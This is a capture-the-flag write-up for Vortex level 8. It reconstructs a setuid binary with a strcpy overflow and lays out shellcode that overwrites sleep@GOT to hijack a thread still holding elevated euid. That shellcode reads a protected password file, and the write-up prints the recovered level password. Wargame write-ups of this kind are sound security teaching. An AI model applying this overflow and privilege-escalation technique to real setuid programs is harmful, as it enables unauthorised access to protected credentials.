# Vortex L8 — solution notes (solved 2026-11-16)

## The program (live binary, verified 2026-11-16)

`/vortex/vortex8`, mode 4750, setuid vortex9, group vortex8, 15152 bytes,
md5 `a2cae4e765bc58316b34dbe7f64af120`.  No published source — the level
page says "Disassemble this dynamically linked executable".  Reconstructed
from `objdump` (the binary is not stripped):

```c
void *safecode(void *arg) {          /* 0x80491d6 — the THREAD */
    int i = 0;
    for (;;) { printf("%d\n", i); fflush(stdout); sleep(1); }
}
int unsafecode(char *src) {          /* 0x8049217 — main thread */
    char buf[1024];                  /* ebp-0x408 */
    strcpy(buf, src);                /* unbounded overflow */
}
int main(int argc, char **argv) {
    pthread_t tid;                   /* ebp-0x1c */
    pthread_create(&tid, 0, safecode, 0);
    syscall(170, getgid(), getgid(), getgid());  /* setresgid — no-op */
    syscall(164, getuid(), getuid(), getuid());  /* setresuid — drops euid */
    unsafecode(argv[1]);             /* the overflow runs AFTER the drop */
}
```

## Measured live

- The overflow runs as plain vortex8 (the drops happen first), while
  `/etc/vortex_pass/vortex9` is `-r-------- vortex9:vortex9`: only
  euid=vortex9 can read it.
- The thread is created BEFORE the drops, and this glibc's raw
  `syscall()` calls are per-thread: **the thread keeps euid=vortex9**.
  Verified two ways: a clean-run fork+exec poller snapshotting
  `/proc/<pid>/task/*/status` caught the transient broadcast state
  (one task `5008 5009 5009 5009`, the other all-5008), and a
  uid-printing shellcode executed inside the hijacked thread reported
  `geteuid()=5009` seconds later.  gdb-attached /proc snapshots show
  both tasks at 5008 — gdb perturbs the setxid broadcast.
- **The session type matters:** over `ssh -T` (no pty) the thread keeps
  euid=5009; over `ssh -tt` (pty) the broadcast drags it to 5008 and the
  exploit fails.  The recorded exploit run is transported over `-T`
  while the `-tt` session displays it (a comment in the cast states
  this).
- `GNU_STACK` is RWE, ASLR off.  `sleep@GOT` (0x804c00c) is writable —
  the GOT sits outside the 0x804bf00–0x804c000 RELRO region.
- The stack buffer address drifts with the session environment:
  0xffffd310 (gdb exec-follow), 0xffffd998 (the working fork/exec
  shape).  The solve script sweeps candidates and detects the hit with a
  uid-signature shellcode (prints getuid/geteuid from inside the
  hijacked thread, looking for 5009) before running the password
  shellcode.
- Path chunking gotcha: the first password shellcode pushed `9pss`
  instead of `tex9` — open() returned ENOENT (fd −2, printed live by a
  debug shellcode) instead of EACCES.  Correct chunks:
  `push 0; push 'tex9'; push '/vor'; push 'pass'; push 'tex_';
  push '/vor'; push '/etc'` = `/etc/vortex_pass/vortex9\0`.

## The exploit

1100-byte argv[1] (raw bytes, NUL-free, delivered by `drv8.c`:

```c
/* fread the payload file into an 8192-byte buffer, NUL-terminate,
   execv /vortex/vortex8 with it as argv[1] */
```

- bytes 8..25: `mov eax,&sc2; mov [0x804c00c],eax; push 0x80491e3; ret`
  — patches sleep@GOT with the password shellcode's address and returns
  main into safecode's loop head (the process never exits).
- bytes 48..112: `open("/etc/vortex_pass/vortex9",0); read(fd,esp,100);
  write(1,esp,n); jmp $-2` — called by the THREAD via the hijacked
  sleep@GOT, with euid=5009; parks the caller afterwards.
- bytes 1032..1035: 0x0804a008 over unsafecode's saved ebp (readable, so
  the loop's `push -0xc(%ebp)` doesn't fault).
- bytes 1036..1039: &sc1 over unsafecode's saved eip.

## Verification

- The uid-signature shellcode printed `geteuid()=5009` from inside the
  hijacked thread (the live proof the race works).
- The password shellcode dumped `XdTW4yCeq\n` (10 bytes) to stdout.
- Login as vortex9 with `XdTW4yCeq` verified (`uid=5009`).

## Password for vortex9

`XdTW4yCeq`

## Files

- `drv8.c` — raw-bytes argv delivery driver (compiled to `drv8`).
- `solve8.py` — payload builder + sweep + uid-signature hit detection +
  password run: `solve8.py <lo_addr> <hi_addr>`.
- The recording: `recordings/vortex/L8.cast`.
